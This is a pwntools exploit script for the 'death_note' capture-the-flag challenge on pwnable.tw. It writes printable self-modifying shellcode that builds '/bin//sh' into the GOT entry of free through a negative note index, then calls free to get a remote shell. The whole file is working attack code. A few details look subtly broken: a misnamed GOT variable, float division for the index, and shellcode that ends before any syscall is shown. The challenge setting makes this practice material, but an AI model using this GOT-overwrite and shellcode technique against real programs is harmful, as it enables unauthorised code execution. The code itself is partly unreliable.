
#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("death_note")
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.27.so")

local = True 
if local:
    p = process("./death_note")
    gdb.attach(p,'''b*0x8048827\nc''')
else:
    p = remote('chall.pwnable.tw', 10201)

elf = context.binary = ELF('./death_note', checksec=False)

def add(idx, data):  #s[i] <= 0x1F || s[i] == 0x7F
    p.sendlineafter(b" :", b"1")
    p.sendafter(b" :", str(idx))
    p.sendlineafter(b" :", data)
    print("=========== ADD_NOTE ===========")

def show(idx):
    p.sendlineafter(b" :", b"2")
    p.sendafter(b" :", str(idx))

def free(idx):
    p.sendlineafter(b"choice :", b"3")
    p.sendlineafter(b"Index :", str(idx))


shellcode = asm(
    '''
    push eax
    pop ebx
    push ecx
    pop eax
    dec eax
    xor ax, 0x4773
    xor ax, 0x3841
    xor [ebx+0x29], ax
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    push esp
    pop ebx
    push 0x77777777
    pop eax
    xor eax, 0x7777777c
    '''
)

printf_got = elf.got['free']
note_addr = 0x0804A060
off_set = printf_got-note_addr
index = off_set/4
print(index)
shellcode += b'\x00'
add(index, shellcode)
free(index)
p.interactive()